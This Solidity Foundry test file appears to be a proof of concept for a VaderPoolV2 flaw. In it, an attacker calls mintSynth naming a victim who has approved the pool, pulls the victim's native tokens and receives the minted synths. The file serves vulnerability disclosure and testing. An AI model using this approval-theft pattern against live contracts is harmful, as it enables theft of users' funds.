// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "forge-std/Test.sol";
import "../src/vader/contracts/dex-v2/pool/VaderPoolV2.sol";
import "../src/vader/contracts/dex-v2/synths/SynthFactory.sol";
import "../src/vader/contracts/interfaces/dex-v2/wrapper/ILPWrapper.sol";
import "../src/vader/contracts/interfaces/shared/IERC20Extended.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @notice Minimal tokens/wrapper used only to exercise the unmodified VaderPoolV2.
contract MockToken is ERC20, IERC20Extended {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function name() public view override(ERC20, IERC20Extended) returns (string memory) { return super.name(); }
    function symbol() public view override(ERC20, IERC20Extended) returns (string memory) { return super.symbol(); }
    function mint(address to, uint256 amount) external override { _mint(to, amount); }
    function burn(uint256 amount) external override { _burn(msg.sender, amount); }
}

contract MockWrapper is ILPWrapper {
    mapping(IERC20 => IERC20Extended) public override tokens;
    IERC20Extended private immutable lp;
    constructor(IERC20Extended _lp) { lp = _lp; }
    function createWrapper(IERC20 foreignAsset) external override { tokens[foreignAsset] = lp; }
}

contract PoC_42335 is Test {
    MockToken nativeAsset;
    MockToken foreignAsset;
    MockToken lpToken;
    VaderPoolV2 pool;
    address victim = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        nativeAsset = new MockToken("Vader", "VADER");
        foreignAsset = new MockToken("USD Coin", "USDC");
        lpToken = new MockToken("Vader LP", "VLP");
        pool = new VaderPoolV2(false, nativeAsset);
        MockWrapper wrapper = new MockWrapper(lpToken);
        SynthFactory factory = new SynthFactory(address(pool));
        pool.initialize(wrapper, factory, address(this));
        pool.setTokenSupport(foreignAsset, true);
        pool.setFungibleTokenSupport(foreignAsset);

        // Seed a real pair through VaderPoolV2.mintFungible, then leave a separate
        // native approval outstanding just as a normal router user would.
        nativeAsset.mint(victim, 110 ether);
        foreignAsset.mint(victim, 100 ether);
        vm.startPrank(victim);
        nativeAsset.approve(address(pool), type(uint256).max);
        foreignAsset.approve(address(pool), type(uint256).max);
        pool.mintFungible(foreignAsset, 100 ether, 100 ether, victim, victim);
        vm.stopPrank();
    }

    function test_arbitrary_caller_can_redirect_victim_native_deposit() public {
        uint256 victimBefore = nativeAsset.balanceOf(victim);
        vm.prank(attacker);
        uint256 minted = pool.mintSynth(foreignAsset, 10 ether, victim, attacker);

        assertGt(minted, 0);
        assertEq(nativeAsset.balanceOf(victim), victimBefore - 10 ether);
        address synth = address(SynthFactory(address(pool.synthFactory())).synths(foreignAsset));
        assertEq(IERC20(synth).balanceOf(attacker), minted);
        assertEq(nativeAsset.balanceOf(address(pool)), 110 ether);
    }
}
